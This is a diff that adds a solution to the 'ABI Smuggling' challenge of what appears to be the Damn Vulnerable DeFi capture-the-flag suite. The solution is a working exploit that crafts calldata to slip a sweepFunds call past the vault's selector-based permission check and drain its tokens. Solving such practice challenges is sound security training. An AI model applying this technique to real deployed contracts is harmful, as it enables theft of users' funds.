@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -73,7 +73,28 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        //`vault.sweepFunds(player, IERC20(address(token)))`
+        bytes memory sweepFundsCalldata =
+            abi.encodeWithSelector(SelfAuthorizedVault.sweepFunds.selector, recovery, IERC20(address(token)));
+        uint256 actionDataLength = sweepFundsCalldata.length;
+
+        //                                                       _________________________________________________________________
+        //                                                       |                                                               |
+        // [executeSelector(4)][paddedTargetAddress(32)][actionDataOffset(32)][empty(32)][paddedWithdrawSelector(32)][actionDataLength(32)][sweepFundsCalldata]
+        // [                              4 + 32 * 3                                    ]
+        bytes memory smuggledCalldata = abi.encodePacked(
+            AuthorizedExecutor.execute.selector, // executeSelector (4)
+            abi.encodePacked(bytes12(0), address(vault)), // paddedTargetAddress (32)
+            abi.encodePacked(uint256(0x80)), // actionDataOffset (32)
+            bytes32(0), // empty (32)
+            abi.encodePacked(SelfAuthorizedVault.withdraw.selector, bytes28(0)), // paddedWithdrawSelector (32)
+            actionDataLength, // actionDataLength (32)
+            sweepFundsCalldata // sweepFundsCalldata (32)
+        );
+
+        // Call the vault with the smuggled calldata
+        (bool success,) = address(vault).call(smuggledCalldata);
+        require(success, "Call failed");
     }
 
     /**
